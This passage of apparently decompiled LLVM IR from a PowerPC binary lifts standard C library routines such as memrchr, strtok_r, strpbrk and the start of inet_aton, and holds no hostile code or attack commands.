  %v4_10012c10 = zext i8 %v3_10012c10 to i32
  %v4_10012c14 = icmp eq i32 %v4_10012c10, %v0_10012ba0
  br i1 %v4_10012c14, label %dec_label_pc_10012c1c, label %dec_label_pc_10012c24

dec_label_pc_10012c1c:                            ; preds = %dec_label_pc_10012c10
  ret i32 %v1_10012bd4

dec_label_pc_10012c24:                            ; preds = %dec_label_pc_10012c10
  %v2_10012c24 = inttoptr i32 %v1_10012bfc to i8*
  %v3_10012c24 = load i8, i8* %v2_10012c24, align 1
  %v4_10012c24 = zext i8 %v3_10012c24 to i32
  %v4_10012c28 = icmp eq i32 %v4_10012c24, %v0_10012ba0
  br i1 %v4_10012c28, label %dec_label_pc_10012c30, label %dec_label_pc_10012c38

dec_label_pc_10012c30:                            ; preds = %dec_label_pc_10012c24
  ret i32 %v1_10012bfc

dec_label_pc_10012c38:                            ; preds = %dec_label_pc_10012c24
  %v2_10012c38 = inttoptr i32 %v1_10012bf8 to i8*
  %v3_10012c38 = load i8, i8* %v2_10012c38, align 1
  %v4_10012c38 = zext i8 %v3_10012c38 to i32
  %v4_10012c3c = icmp eq i32 %v4_10012c38, %v0_10012ba0
  br i1 %v4_10012c3c, label %dec_label_pc_10012c44, label %dec_label_pc_10012c4c.backedge

dec_label_pc_10012c44:                            ; preds = %dec_label_pc_10012c38
  ret i32 %v1_10012bf8

dec_label_pc_10012c50:                            ; preds = %dec_label_pc_10012c4c.backedge, %dec_label_pc_10012ba0
  %v0_10012c5c26 = phi i32 [ %v0_10012bc816, %dec_label_pc_10012ba0 ], [ %v1_10012bcc, %dec_label_pc_10012c4c.backedge ]
  %v0_10012c50 = phi i32 [ %v0_10012ba4, %dec_label_pc_10012ba0 ], [ %v1_10012bd0, %dec_label_pc_10012c4c.backedge ]
  %v1_10012c50 = add i32 %v0_10012c50, 1
  store i32 %v1_10012c50, i32* %r5.global-to-local, align 4
  store i32 %v0_10012c50, i32* %ctr.global-to-local, align 4
  %v2_10012c6c3 = icmp eq i32 %v0_10012c50, 0
  br i1 %v2_10012c6c3, label %dec_label_pc_10012c70, label %dec_label_pc_10012c5c

dec_label_pc_10012c5c:                            ; preds = %dec_label_pc_10012c50, %dec_label_pc_10012c5c.dec_label_pc_10012c5c_crit_edge
  %v1_10012c60 = phi i32 [ %v1_10012c60.pre, %dec_label_pc_10012c5c.dec_label_pc_10012c5c_crit_edge ], [ %v0_10012ba0, %dec_label_pc_10012c50 ]
  %v0_10012c5c = phi i32 [ %v1_10012c68, %dec_label_pc_10012c5c.dec_label_pc_10012c5c_crit_edge ], [ %v0_10012c5c26, %dec_label_pc_10012c50 ]
  %v1_10012c5c = inttoptr i32 %v0_10012c5c to i8*
  %v2_10012c5c = load i8, i8* %v1_10012c5c, align 1
  %v3_10012c5c = zext i8 %v2_10012c5c to i32
  %v4_10012c60 = icmp eq i32 %v3_10012c5c, %v1_10012c60
  %v0_10012c64 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012c60, i32 %v0_10012c64)
  %v0_10012c68 = load i32, i32* @r3, align 4
  %v1_10012c68 = add i32 %v0_10012c68, 1
  store i32 %v1_10012c68, i32* @r3, align 4
  %v0_10012c6c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012c6c = add i32 %v0_10012c6c, -1
  store i32 %v1_10012c6c, i32* %ctr.global-to-local, align 4
  %v2_10012c6c = icmp eq i32 %v1_10012c6c, 0
  br i1 %v2_10012c6c, label %dec_label_pc_10012c70, label %dec_label_pc_10012c5c.dec_label_pc_10012c5c_crit_edge

dec_label_pc_10012c5c.dec_label_pc_10012c5c_crit_edge: ; preds = %dec_label_pc_10012c5c
  %v1_10012c60.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012c5c

dec_label_pc_10012c70:                            ; preds = %dec_label_pc_10012c5c, %dec_label_pc_10012c50
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10012c6c, { 1, 0 }
  uselistorder i32 %v1_10012c68, { 1, 0 }
  uselistorder i32 %v0_10012c50, { 1, 2, 0 }
  uselistorder i32 %v1_10012c4c, { 2, 1, 0 }
  uselistorder i32 %v1_10012bd0, { 0, 2, 1 }
  uselistorder i32 %v1_10012bcc, { 0, 2, 1 }
  uselistorder i32 %v0_10012c08, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_10012ba8, { 1, 0 }
  uselistorder i32 %v1_10012ba4, { 1, 0 }
  uselistorder i32 %v0_10012bc816, { 1, 0 }
  uselistorder i32 %v0_10012ba0, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_10012ba4, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10012b98, { 1, 0 }
  uselistorder i32 %v1_10012b90, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10012b947, { 2, 0, 1 }
  uselistorder i32 %v1_10012b74, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10012c4c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10012bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10012b9c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268512404, i32* @lr, align 4
  %v0_10012c90 = call i32 @memcpy()
  %v0_10012c98 = load i32, i32* @r28, align 4
  %v1_10012c98 = load i32, i32* @r29, align 4
  %v2_10012c98 = add i32 %v1_10012c98, %v0_10012c98
  ret i32 %v2_10012c98
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10012cb0 = urem i32 %arg2, 256
  store i32 %v1_10012cb0, i32* %r4.global-to-local, align 4
  %v2_10012cb8 = add i32 %arg3, %arg1
  store i32 %v2_10012cb8, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_10012cd413 = icmp eq i32 %arg3, 0
  br i1 %v2_10012cd413, label %dec_label_pc_10012cdc, label %dec_label_pc_10012cd8

dec_label_pc_10012cc0:                            ; preds = %dec_label_pc_10012cd8
  %v1_10012cc0 = add i32 %v0_10012cc0, -1
  %v2_10012cc0 = inttoptr i32 %v1_10012cc0 to i8*
  %v3_10012cc0 = load i8, i8* %v2_10012cc0, align 1
  %v4_10012cc0 = zext i8 %v3_10012cc0 to i32
  store i32 %v1_10012cc0, i32* %r3.global-to-local, align 4
  %v0_10012cc4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012cc4 = add i32 %v0_10012cc4, -1
  store i32 %v1_10012cc4, i32* %r5.global-to-local, align 4
  %v1_10012cc8 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012cc8 = icmp eq i32 %v4_10012cc0, %v1_10012cc8
  %v0_10012ccc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012cc8, i32 %v0_10012ccc)
  %v0_10012cd0 = load i32, i32* %r3.global-to-local, align 4
  %v0_10012cd4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012cd4 = add i32 %v0_10012cd4, -1
  store i32 %v1_10012cd4, i32* %ctr.global-to-local, align 4
  %v2_10012cd4 = icmp eq i32 %v1_10012cd4, 0
  br i1 %v2_10012cd4, label %dec_label_pc_10012cdc.loopexit, label %dec_label_pc_10012cd8

dec_label_pc_10012cd8:                            ; preds = %entry, %dec_label_pc_10012cc0
  %v0_10012cc0 = phi i32 [ %v0_10012cd0, %dec_label_pc_10012cc0 ], [ %v2_10012cb8, %entry ]
  %v0_10012cd8.in.in = phi i32 [ %v0_10012cd0, %dec_label_pc_10012cc0 ], [ %v2_10012cb8, %entry ]
  %v0_10012cd8.in = urem i32 %v0_10012cd8.in.in, 4
  %v0_10012cd8 = icmp eq i32 %v0_10012cd8.in, 0
  br i1 %v0_10012cd8, label %dec_label_pc_10012cdc.loopexit, label %dec_label_pc_10012cc0

dec_label_pc_10012cdc.loopexit:                   ; preds = %dec_label_pc_10012cd8, %dec_label_pc_10012cc0
  %v0_10012d0416.ph = phi i32 [ %v0_10012cd0, %dec_label_pc_10012cc0 ], [ %v0_10012cc0, %dec_label_pc_10012cd8 ]
  %v0_10012cdc.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10012ce0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012cdc

dec_label_pc_10012cdc:                            ; preds = %dec_label_pc_10012cdc.loopexit, %entry
  %v0_10012ce0 = phi i32 [ 0, %entry ], [ %v0_10012ce0.pre, %dec_label_pc_10012cdc.loopexit ]
  %v0_10012cdc = phi i32 [ %v1_10012cb0, %entry ], [ %v0_10012cdc.pre, %dec_label_pc_10012cdc.loopexit ]
  %v0_10012d0416 = phi i32 [ %v2_10012cb8, %entry ], [ %v0_10012d0416.ph, %dec_label_pc_10012cdc.loopexit ]
  %v1_10012cdc = mul i32 %v0_10012cdc, 256
  %v1_10012ce0 = udiv i32 %v0_10012ce0, 4
  %v2_10012ce4 = or i32 %v1_10012cdc, %v0_10012cdc
  %v1_10012cec = mul i32 %v2_10012ce4, 65536
  %v2_10012cf8 = or i32 %v1_10012cec, %v2_10012ce4
  store i32 %v2_10012cf8, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_10012ce0, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10012ce0, 4
  br i1 %tmp, label %dec_label_pc_10012d7c, label %dec_label_pc_10012d04

dec_label_pc_10012d04:                            ; preds = %dec_label_pc_10012cdc, %dec_label_pc_10012d78.backedge.dec_label_pc_10012d04_crit_edge
  %v0_10012d7821 = phi i32 [ %v1_10012d78, %dec_label_pc_10012d78.backedge.dec_label_pc_10012d04_crit_edge ], [ %v1_10012ce0, %dec_label_pc_10012cdc ]
  %v0_10012d24 = phi i32 [ %v0_10012d24.pre, %dec_label_pc_10012d78.backedge.dec_label_pc_10012d04_crit_edge ], [ -2130640640, %dec_label_pc_10012cdc ]
  %v0_10012d0c = phi i32 [ %v0_10012d0c.pre, %dec_label_pc_10012d78.backedge.dec_label_pc_10012d04_crit_edge ], [ %v2_10012cf8, %dec_label_pc_10012cdc ]
  %v0_10012d08 = phi i32 [ %v0_10012d08.pre, %dec_label_pc_10012d78.backedge.dec_label_pc_10012d04_crit_edge ], [ %v0_10012ce0, %dec_label_pc_10012cdc ]
  %v0_10012d04 = phi i32 [ %v0_10012d04.pre, %dec_label_pc_10012d78.backedge.dec_label_pc_10012d04_crit_edge ], [ %v0_10012d0416, %dec_label_pc_10012cdc ]
  %v1_10012d04 = add i32 %v0_10012d04, -4
  %v2_10012d04 = inttoptr i32 %v1_10012d04 to i32*
  %v3_10012d04 = load i32, i32* %v2_10012d04, align 4
  store i32 %v1_10012d04, i32* %r3.global-to-local, align 4
  %v1_10012d08 = add i32 %v0_10012d08, -4
  store i32 %v1_10012d08, i32* %r5.global-to-local, align 4
  %v2_10012d0c = xor i32 %v3_10012d04, %v0_10012d0c
  %v1_10012d10 = add i32 %v0_10012d04, -3
  %v1_10012d18 = add i32 %v2_10012d0c, 2130640639
  %v1_10012d20 = add i32 %v0_10012d04, -2
  %v2_10012d1c = sub i32 -1, %v2_10012d0c
  %v2_10012d24 = xor i32 %v1_10012d18, %v2_10012d1c
  %v3_10012d24 = and i32 %v2_10012d24, %v0_10012d24
  %v6_10012d24 = icmp eq i32 %v3_10012d24, 0
  %v1_10012d28 = add i32 %v0_10012d04, -1
  br i1 %v6_10012d24, label %dec_label_pc_10012d78.backedge, label %dec_label_pc_10012d30

dec_label_pc_10012d30:                            ; preds = %dec_label_pc_10012d04
  %v2_10012d30 = inttoptr i32 %v1_10012d28 to i8*
  %v3_10012d30 = load i8, i8* %v2_10012d30, align 1
  %v4_10012d30 = zext i8 %v3_10012d30 to i32
  %v1_10012d34 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012d34 = icmp eq i32 %v4_10012d30, %v1_10012d34
  br i1 %v4_10012d34, label %dec_label_pc_10012d3c, label %dec_label_pc_10012d44

dec_label_pc_10012d3c:                            ; preds = %dec_label_pc_10012d30
  store i32 %v1_10012d28, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012d28

dec_label_pc_10012d44:                            ; preds = %dec_label_pc_10012d30
  %v2_10012d44 = inttoptr i32 %v1_10012d20 to i8*
  %v3_10012d44 = load i8, i8* %v2_10012d44, align 1
  %v4_10012d44 = zext i8 %v3_10012d44 to i32
  %v4_10012d48 = icmp eq i32 %v4_10012d44, %v1_10012d34
  br i1 %v4_10012d48, label %dec_label_pc_10012d50, label %dec_label_pc_10012d58

dec_label_pc_10012d50:                            ; preds = %dec_label_pc_10012d44
  store i32 %v1_10012d20, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012d20

dec_label_pc_10012d58:                            ; preds = %dec_label_pc_10012d44
  %v2_10012d58 = inttoptr i32 %v1_10012d10 to i8*
  %v3_10012d58 = load i8, i8* %v2_10012d58, align 1
  %v4_10012d58 = zext i8 %v3_10012d58 to i32
  %v4_10012d5c = icmp eq i32 %v4_10012d58, %v1_10012d34
  br i1 %v4_10012d5c, label %dec_label_pc_10012d64, label %dec_label_pc_10012d6c

dec_label_pc_10012d64:                            ; preds = %dec_label_pc_10012d58
  store i32 %v1_10012d10, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012d10

dec_label_pc_10012d6c:                            ; preds = %dec_label_pc_10012d58
  %v1_10012d6c = inttoptr i32 %v1_10012d04 to i8*
  %v2_10012d6c = load i8, i8* %v1_10012d6c, align 1
  %v3_10012d6c = zext i8 %v2_10012d6c to i32
  %v4_10012d70 = icmp eq i32 %v3_10012d6c, %v1_10012d34
  %v0_10012d74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012d70, i32 %v0_10012d74)
  %v0_10012d78.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10012d78.backedge

dec_label_pc_10012d78.backedge:                   ; preds = %dec_label_pc_10012d6c, %dec_label_pc_10012d04
  %v0_10012d78 = phi i32 [ %v0_10012d78.pre, %dec_label_pc_10012d6c ], [ %v0_10012d7821, %dec_label_pc_10012d04 ]
  %v1_10012d78 = add i32 %v0_10012d78, -1
  store i32 %v1_10012d78, i32* %ctr.global-to-local, align 4
  %v2_10012d78 = icmp eq i32 %v1_10012d78, 0
  br i1 %v2_10012d78, label %dec_label_pc_10012d78.dec_label_pc_10012d7c_crit_edge, label %dec_label_pc_10012d78.backedge.dec_label_pc_10012d04_crit_edge

dec_label_pc_10012d78.backedge.dec_label_pc_10012d04_crit_edge: ; preds = %dec_label_pc_10012d78.backedge
  %v0_10012d04.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10012d08.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10012d0c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10012d24.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012d04

dec_label_pc_10012d78.dec_label_pc_10012d7c_crit_edge: ; preds = %dec_label_pc_10012d78.backedge
  %v0_10012d7c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012d7c

dec_label_pc_10012d7c:                            ; preds = %dec_label_pc_10012d78.dec_label_pc_10012d7c_crit_edge, %dec_label_pc_10012cdc
  %v0_10012d7c = phi i32 [ %v0_10012d7c.pre, %dec_label_pc_10012d78.dec_label_pc_10012d7c_crit_edge ], [ %v0_10012ce0, %dec_label_pc_10012cdc ]
  %v1_10012d7c = add i32 %v0_10012d7c, 1
  store i32 %v1_10012d7c, i32* %r5.global-to-local, align 4
  store i32 %v0_10012d7c, i32* %ctr.global-to-local, align 4
  %v2_10012d943 = icmp eq i32 %v0_10012d7c, 0
  br i1 %v2_10012d943, label %dec_label_pc_10012d98, label %dec_label_pc_10012d88

dec_label_pc_10012d88:                            ; preds = %dec_label_pc_10012d7c, %dec_label_pc_10012d88
  %v0_10012d88 = load i32, i32* %r3.global-to-local, align 4
  %v1_10012d88 = add i32 %v0_10012d88, -1
  %v2_10012d88 = inttoptr i32 %v1_10012d88 to i8*
  %v3_10012d88 = load i8, i8* %v2_10012d88, align 1
  %v4_10012d88 = zext i8 %v3_10012d88 to i32
  store i32 %v1_10012d88, i32* %r3.global-to-local, align 4
  %v1_10012d8c = load i32, i32* %r4.global-to-local, align 4
  %v4_10012d8c = icmp eq i32 %v4_10012d88, %v1_10012d8c
  %v0_10012d90 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012d8c, i32 %v0_10012d90)
  %v0_10012d94 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012d94 = add i32 %v0_10012d94, -1
  store i32 %v1_10012d94, i32* %ctr.global-to-local, align 4
  %v2_10012d94 = icmp eq i32 %v1_10012d94, 0
  br i1 %v2_10012d94, label %dec_label_pc_10012d98, label %dec_label_pc_10012d88

dec_label_pc_10012d98:                            ; preds = %dec_label_pc_10012d88, %dec_label_pc_10012d7c
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10012d94, { 1, 0 }
  uselistorder i32 %v0_10012d7c, { 1, 2, 0 }
  uselistorder i32 %v1_10012d78, { 2, 1, 0 }
  uselistorder i32 %v1_10012d28, { 1, 0, 2 }
  uselistorder i32 %v1_10012d20, { 1, 0, 2 }
  uselistorder i32 %v1_10012d10, { 1, 0, 2 }
  uselistorder i32 %v2_10012ce4, { 1, 0 }
  uselistorder i32 %v1_10012ce0, { 1, 0 }
  uselistorder i32 %v0_10012cdc, { 1, 0 }
  uselistorder i32 %v0_10012ce0, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10012cd4, { 1, 0 }
  uselistorder i32 %v0_10012cd0, { 1, 0, 2 }
  uselistorder i32 %v2_10012cb8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10012cb0, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 4, 6, 5, 7, 1, 3, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 1, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 9, 8, 5, 6, 7, 10, 0, 1, 2 }
  uselistorder i32* %ctr.global-to-local, { 6, 5, 3, 8, 7, 4, 0, 1, 2 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10012d88, { 1, 0 }
  uselistorder label %dec_label_pc_10012d04, { 1, 0 }
  uselistorder label %dec_label_pc_10012cd8, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_10012da4 = load i32, i32* @lr, align 4
  store i32 %v0_10012da4, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10012dac = icmp eq i32 %arg1, 0
  %v0_10012db4 = load i32, i32* @r5, align 4
  store i32 %v0_10012db4, i32* %r30.global-to-local, align 4
  %v0_10012db8 = load i32, i32* @r4, align 4
  store i32 %v0_10012db8, i32* %r29.global-to-local, align 4
  br i1 %v3_10012dac, label %dec_label_pc_10012dc0, label %dec_label_pc_10012dc4

dec_label_pc_10012dc0:                            ; preds = %entry
  %v1_10012dc0 = inttoptr i32 %v0_10012db4 to i32*
  %v2_10012dc0 = load i32, i32* %v1_10012dc0, align 4
  store i32 %v2_10012dc0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10012dc4

dec_label_pc_10012dc4:                            ; preds = %entry, %dec_label_pc_10012dc0
  %v0_10012dc4 = phi i32 [ %arg1, %entry ], [ %v2_10012dc0, %dec_label_pc_10012dc0 ]
  store i32 %v0_10012dc4, i32* @r3, align 4
  %v1_10012dc8 = inttoptr i32 %v0_10012dc4 to i8*
  %v2_10012dc8 = call i32 @__GI_strspn(i8* %v1_10012dc8)
  %v0_10012dcc = load i32, i32* %r29.global-to-local, align 4
  %v0_10012dd0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10012dd0 = add i32 %v0_10012dd0, %v2_10012dc8
  %v3_10012dd0 = inttoptr i32 %v2_10012dd0 to i8*
  %v4_10012dd0 = load i8, i8* %v3_10012dd0, align 1
  store i32 %v2_10012dd0, i32* @r31, align 4
  store i32 %v2_10012dd0, i32* @r3, align 4
  %v3_10012ddc = icmp eq i8 %v4_10012dd0, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10012ddc, label %dec_label_pc_10012de8, label %dec_label_pc_10012df0

dec_label_pc_10012de8:                            ; preds = %dec_label_pc_10012dc4
  %v1_10012de8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012de8 = inttoptr i32 %v1_10012de8 to i32*
  store i32 %v2_10012dd0, i32* %v2_10012de8, align 4
  br label %dec_label_pc_10012e28

dec_label_pc_10012df0:                            ; preds = %dec_label_pc_10012dc4
  store i32 268512756, i32* @lr, align 4
  %v3_10012df0 = call i32 @__GI_strpbrk(i8* %v3_10012dd0, i32 %v0_10012dcc)
  %v4_10012df8 = icmp eq i32 %v3_10012df0, 0
  %v0_10012dfc = load i32, i32* @r31, align 4
  store i32 %v0_10012dfc, i32* @r3, align 4
  %v2_10012e00 = add i32 %v3_10012df0, 1
  store i32 %v2_10012e00, i32* %r11.global-to-local, align 4
  br i1 %v4_10012df8, label %dec_label_pc_10012e08, label %dec_label_pc_10012e18

dec_label_pc_10012e08:                            ; preds = %dec_label_pc_10012df0
  store i32 268512780, i32* @lr, align 4
  %v4_10012e08 = call i32 @rawmemchr(i32 %v0_10012dfc, i32 0, i32 0)
  %v0_10012e0c = load i32, i32* @r31, align 4
  store i32 %v0_10012e0c, i32* %r0.global-to-local, align 4
  %v1_10012e10 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012e10 = inttoptr i32 %v1_10012e10 to i32*
  store i32 %v4_10012e08, i32* %v2_10012e10, align 4
  br label %dec_label_pc_10012e28

dec_label_pc_10012e18:                            ; preds = %dec_label_pc_10012df0
  %v1_10012df8 = inttoptr i32 %v3_10012df0 to i8*
  store i8 0, i8* %v1_10012df8, align 1
  %v0_10012e20 = load i32, i32* @r31, align 4
  store i32 %v0_10012e20, i32* %r0.global-to-local, align 4
  %v0_10012e24 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012e24 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012e24 = inttoptr i32 %v1_10012e24 to i32*
  store i32 %v0_10012e24, i32* %v2_10012e24, align 4
  br label %dec_label_pc_10012e28

dec_label_pc_10012e28:                            ; preds = %dec_label_pc_10012e08, %dec_label_pc_10012de8, %dec_label_pc_10012e18
  %v0_10012e28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10012da4, i32* %r0.global-to-local, align 4
  ret i32 %v0_10012e28

; uselistorder directives
  uselistorder i32 %v3_10012df0, { 2, 0, 1 }
  uselistorder i32 %v2_10012dd0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10012dc4, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_10012e28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012dc4, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10012e601 = load i32, i32* @r3, align 4
  %v1_10012e602 = inttoptr i32 %v0_10012e601 to i8*
  %v2_10012e603 = load i8, i8* %v1_10012e602, align 1
  %v3_10012e604 = zext i8 %v2_10012e603 to i32
  store i32 %v3_10012e604, i32* %r11.global-to-local, align 4
  %v3_10012e646 = icmp eq i8 %v2_10012e603, 0
  br i1 %v3_10012e646, label %dec_label_pc_10012e74, label %dec_label_pc_10012e6c

dec_label_pc_10012e44:                            ; preds = %dec_label_pc_10012e48
  %v3_10012e48 = zext i8 %v2_10012e48 to i32
  %v4_10012e54 = icmp eq i32 %v3_10012e48, %v1_10012e54
  %v0_10012e44 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012e54, i32 %v0_10012e44)
  %v0_10012e48.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10012e54.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10012e48

dec_label_pc_10012e48:                            ; preds = %dec_label_pc_10012e6c, %dec_label_pc_10012e44
  %v1_10012e54 = phi i32 [ %v1_10012e549, %dec_label_pc_10012e6c ], [ %v1_10012e54.pre, %dec_label_pc_10012e44 ]
  %v0_10012e48 = phi i32 [ %tmp, %dec_label_pc_10012e6c ], [ %v0_10012e48.pre, %dec_label_pc_10012e44 ]
  %v1_10012e48 = inttoptr i32 %v0_10012e48 to i8*
  %v2_10012e48 = load i8, i8* %v1_10012e48, align 1
  %v1_10012e4c = add i32 %v0_10012e48, 1
  store i32 %v1_10012e4c, i32* %r9.global-to-local, align 4
  %v3_10012e50 = icmp eq i8 %v2_10012e48, 0
  br i1 %v3_10012e50, label %dec_label_pc_10012e5c, label %dec_label_pc_10012e44

dec_label_pc_10012e5c:                            ; preds = %dec_label_pc_10012e48
  %v0_10012e5c = load i32, i32* @r3, align 4
  %v1_10012e5c = add i32 %v0_10012e5c, 1
  store i32 %v1_10012e5c, i32* @r3, align 4
  %v1_10012e60 = inttoptr i32 %v1_10012e5c to i8*
  %v2_10012e60 = load i8, i8* %v1_10012e60, align 1
  %v3_10012e60 = zext i8 %v2_10012e60 to i32
  store i32 %v3_10012e60, i32* %r11.global-to-local, align 4
  %v3_10012e64 = icmp eq i8 %v2_10012e60, 0
  br i1 %v3_10012e64, label %dec_label_pc_10012e74, label %dec_label_pc_10012e6c

dec_label_pc_10012e6c:                            ; preds = %entry, %dec_label_pc_10012e5c
  %v1_10012e549 = phi i32 [ %v3_10012e60, %dec_label_pc_10012e5c ], [ %v3_10012e604, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10012e48

dec_label_pc_10012e74:                            ; preds = %dec_label_pc_10012e5c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10012e48, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012e6c, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10012e7c = icmp eq i8* %arg1, null
  br i1 %v3_10012e7c, label %dec_label_pc_10012f34, label %dec_label_pc_10012e84

dec_label_pc_10012e84:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10012e98.pre = load i32, i32* @global_var_1002c8a8, align 4
  br label %dec_label_pc_10012e94

dec_label_pc_10012e94:                            ; preds = %dec_label_pc_10012e84, %dec_label_pc_10012f0c
  %v0_10012f0c = phi i32 [ 0, %dec_label_pc_10012e84 ], [ %v2_10012f14, %dec_label_pc_10012f0c ]
  %v0_10012f10 = phi i32 [ 1, %dec_label_pc_10012e84 ], [ %v1_10012f10, %dec_label_pc_10012f0c ]
  %v0_10012e94 = phi i32 [ %tmp, %dec_label_pc_10012e84 ], [ %v0_10012e943, %dec_label_pc_10012f0c ]
  %v1_10012e94 = inttoptr i32 %v0_10012e94 to i8*
  %v2_10012e94 = load i8, i8* %v1_10012e94, align 1
  %v3_10012e94 = zext i8 %v2_10012e94 to i32
  %v1_10012e9c = mul nuw nsw i32 %v3_10012e94, 2
  %v2_10012ea0 = add i32 %v1_10012e9c, %v3_10012e98.pre
  %v3_10012ea0 = inttoptr i32 %v2_10012ea0 to i16*
  %v4_10012ea0 = load i16, i16* %v3_10012ea0, align 2
  %v1_10012ea4 = and i16 %v4_10012ea0, 8
  %v3_10012ea4 = icmp eq i16 %v1_10012ea4, 0
  br i1 %v3_10012ea4, label %dec_label_pc_10012f34, label %dec_label_pc_10012eac

dec_label_pc_10012eac:                            ; preds = %dec_label_pc_10012e94
  br label %dec_label_pc_10012ec4

dec_label_pc_10012eb4:                            ; preds = %dec_label_pc_10012ec4
  %v1_10012ec8 = mul i32 %v1_10012f14, 10
  %v2_10012ed0 = add i32 %v3_10012ec4, %v1_10012ec8
  %v1_10012eb4 = add i32 %v2_10012ed0, -48
  %v1_10012eb8 = add i32 %v0_10012efc, 1
  %v2_10012ebc = icmp sgt i32 %v1_10012eb4, 255
  br i1 %v2_10012ebc, label %dec_label_pc_10012f34, label %dec_label_pc_10012ec4

